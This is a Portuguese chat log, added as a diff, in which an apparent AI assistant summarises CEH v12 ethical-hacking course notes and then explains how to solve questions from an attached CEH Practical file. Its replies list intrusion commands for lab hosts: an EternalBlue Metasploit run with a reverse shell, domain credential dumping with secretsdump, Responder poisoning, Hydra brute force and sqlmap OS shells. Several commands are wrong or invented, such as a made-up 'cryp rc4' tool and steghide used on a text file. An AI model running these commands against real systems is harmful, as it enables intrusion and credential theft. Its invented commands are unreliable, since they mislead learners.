@@ -1,0 +1,252 @@
+Resumo CEH v12 Treimanemto
+
+
+escreva em portugues
+Claro! Aqui está um resumo do seu documento:
+
+Seu documento descreve um curso de treinamento (CEHV12) para hacking ético, incluindo:
+
+Detalhes importantes como instrutor, datas e centro de treinamento.
+
+Passos para fazer o download e armazenar o certificado após a conclusão.
+
+Instruções de preparação para o laboratório de pentest, incluindo configuração de VPN.
+
+Vários comandos e ferramentas usadas em pentest (por exemplo, Python, ferramentas de OSINT, configuração de conexão, métodos de varredura).
+
+Técnicas para enumeração, exploração e escalada de privilégios em diferentes plataformas (por exemplo, Windows, Linux).
+
+Seções sobre diferentes módulos, como Segurança de Aplicações Web, Injeção de SQL, Wireless, Mobile e Cloud.
+
+Instruções para usar ferramentas como Metasploit, Nmap, Hydra, Aircrack-ng e outras.
+
+O documento fornece instruções detalhadas de linha de comando e links para recursos.
+
+Precisa de alguma parte específica explicada ou de alguma outra assistência com esse conteúdo?
+
+quero separadamente uso das ferramentes de acordo com o texto
+Claro! Aqui está a lista separada das ferramentas e seus usos, conforme mencionado no texto:
+
+Ferramentas OSINT:
+searx.space: Ferramenta de busca para informações de código aberto.
+
+Preparação para Pentest:
+Python:
+
+Compilação para 32bits: apt-get install gcc-multilib g++-multilib
+
+Invocar bash via Python: python -c 'import pty;pty.spawn("/bin/bash");'
+
+Servidor web em Python: python3 -m http.server 80
+
+Conexão ao LabPentest:
+VPN: Usar openvpn para conectar ao arquivo connection.ovpn fornecido por email.
+
+Configuração de Teclado e Cheatsheets:
+Configuração de teclado: setxkbmap -model abnt2 -layout br
+
+Cheatsheet via linha de comando:
+
+Alias: alias cht='f(){ curl -skL http://cheat.sh/"$@"; unset -f f; }; f'
+
+Exemplos: cht nmap, cht steghide, cht find, cht tcpdump
+
+Ferramentas de Clonagem e Uso:
+ctfr:
+
+Clonagem: git clone https://github.com/UnaPibaGeek/ctfr.git
+
+Instalação: pip3 install -r requirements.txt
+
+Uso: python3 ctfr.py -d pimpao.com.br
+
+dnsdumpster e crt.sh: Ferramentas para levantamento de subdomínios.
+
+Ferramentas de Enumeração:
+theHarvester:
+
+Busca no LinkedIn: theHarvester -d eccouncil -l 200 -b linkedin
+
+Netcraft:
+
+Levantamento de sistema operacional: sitereport.netcraft.com
+
+Shodan:
+
+Mapeamento de dispositivos: shodan.io
+
+CEWL:
+
+Gerar dicionários: cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt
+
+Ferramentas Recon-ng:
+Recon-ng:
+
+Criação de workspaces e módulos:
+
+bash
+recon-ng
+workspaces create CEH
+modules load recon/domains-hosts/brute_hosts
+Scanning e Enumeração de Rede:
+hping3:
+
+Scanning e XMAS: hping3 -S -p 80 192.168.10.101
+
+Nmap:
+
+SNMP: nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse
+
+Exploração e Privilege Escalation:
+Metasploit:
+
+Uso do exploit ms17-010:
+
+bash
+search ms17-010
+use 2
+set rhosts 10.10.10.7
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+Impacket:
+
+Uso do secretsdump: impacket-secretsdump.py -just-dc CEH/SERVER2016$@10.10.10.16
+
+Ferramentas de Invasão de Sistema:
+Responder:
+
+Captura por envenenamento: responder -I eth0
+
+Hydra:
+
+Quebra de senha: hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113
+
+Ferramentas de Wireless:
+Aircrack-ng:
+
+Quebra de senha de handshake: aircrack-ng -w dicionario.txt pacotescapturados.pcap
+
+Crunch:
+
+Gerar dicionário em memória: crunch 8 8 0123456789 | aircrack-ng -t -h -b macaddressaccesspoint pacotescapturados.cap -w -
+
+Ferramentas de Mobile:
+Phonesploit:
+
+Conectar via ADB e capturar screenshots.
+
+Ferramentas de Cloud:
+AWS CLI:
+
+Instalação e configuração:
+
+bash
+pip3 install awscli
+aws configure
+S3Scanner:
+
+Procurar e fazer dump de buckets:
+
+bash
+cd /opt/S3Scanner
+python3 s3scanner.py sites.txt -d
+Essas são as ferramentas listadas e o uso conforme o conteúdo do seu documento. Precisa de mais alguma coisa?
+
+crie em um arquivo so pra eu baixar tem como?
+Claro! Acabei de criar um arquivo com a lista das ferramentas e seus usos conforme o conteúdo do seu documento. Você pode baixá-lo clicando no link abaixo:
+
+Baixar Ferramentas_e_Usos.txt
+
+774103561-CEH-Practical-1.pdf
+
+PDF
+
+Quais ferramente e como eu usaria elas para responder essas perguntas
+Para responder às perguntas do arquivo, você pode usar várias ferramentas e técnicas de hacking ético. Aqui estão algumas ferramentas específicas e instruções sobre como usá-las para cada pergunta mencionada:
+
+Blind SQL Injection: Use sqlmap para automatizar a detecção de SQL Injection e obter informações sobre o sistema operacional.
+
+bash
+sqlmap -u "URL_DO_SITE" --dbms=mysql --os-shell
+Enumeração de Usuários de Domínio: Utilize net user e net group para listar usuários e grupos no domínio.
+
+bash
+net user
+net group /domain
+Varredura de Portas RDP: Utilize Nmap para identificar portas abertas e serviços.
+
+bash
+nmap -p 3389 --open 172.16.0.0/24
+Descriptografia DES (ECB): Use openssl para descriptografar arquivos usando o algoritmo DES.
+
+bash
+openssl enc -d -des-ecb -in Cry-DES-FTP-IP.hex -out decrypted.txt
+Esteganografia: Utilize steghide para extrair dados ocultos em arquivos.
+
+bash
+steghide extract -sf Confidential.txt -p test
+Banco de Dados WordPress: Utilize WPScan para enumerar usuários e obter senhas.
+
+bash
+wpscan --url http://172.16.0.27:8080/CEH --enumerate u
+Quebra de Hash MD5: Utilize hashcat para quebrar hashes MD5.
+
+bash
+hashcat -m 0 -a 0 hash.txt wordlist.txt
+Backdoor e Recuperação de Arquivos: Utilize Metasploit para explorar backdoors e obter arquivos.
+
+bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 172.16.0.27
+exploit
+Análise de Pacotes de Rede: Utilize Wireshark para analisar arquivos de captura de pacotes (pcapng).
+
+bash
+wireshark Dos.pcapng
+Análise de Ataque DDoS: Utilize Wireshark para identificar o número de máquinas que participaram do ataque.
+
+bash
+wireshark DDoS.pcapng
+Quebra de Credenciais FTP: Utilize Hydra para força bruta em servidores FTP.
+
+bash
+hydra -l username -P password_list.txt ftp://172.16.0.27
+Conexão RDP: Utilize rdesktop para acessar o servidor Windows remotamente.
+
+bash
+rdesktop -u Administrator -p shadow123 172.16.0.27
+Ataque SQLi: Utilize sqlmap para testar vulnerabilidades SQL.
+
+bash
+sqlmap -u "http://www.moviescope.com" --cookie="SESSAO"
+Análise de Tráfego em Texto Plano: Utilize Wireshark para capturar e analisar tráfego HTTP.
+
+bash
+wireshark moviescope.com.pcapng
+Teste de Método HTTP: Utilize OWASP ZAP para testar diferentes métodos HTTP.
+
+bash
+OWASP ZAP
+Verificação de Integridade de Arquivos: Utilize md5sum para comparar hashes de arquivos.
+
+bash
+md5sum original_file tampered_file
+Descriptografia VeraCrypt: Utilize VeraCrypt para montar volumes criptografados e acessar arquivos.
+
+bash
+veracrypt --mount secret
+Descriptografia RC4: Utilize CrypTool para descriptografar arquivos RC4.
+
+bash
+cryp rc4 -in Cry-Rc4-Accountno.hex -out decrypted.txt -key 14
+Acesso ao Android: Utilize ADB (Android Debug Bridge) para acessar e manipular arquivos em dispositivos Android.
+
+bash
+adb shell
+Decodificação de Dados: Utilize base64 ou outras ferramentas de decodificação conforme necessário.
+
+bash
+echo "conteúdo codificado" | base64 --decode
+Estas são as ferramentas e técnicas que você pode usar para resolver cada uma das questões mencionadas. Se precisar de mais detalhes sobre qualquer ferramenta ou instrução específica, estou aqui para ajudar!
+
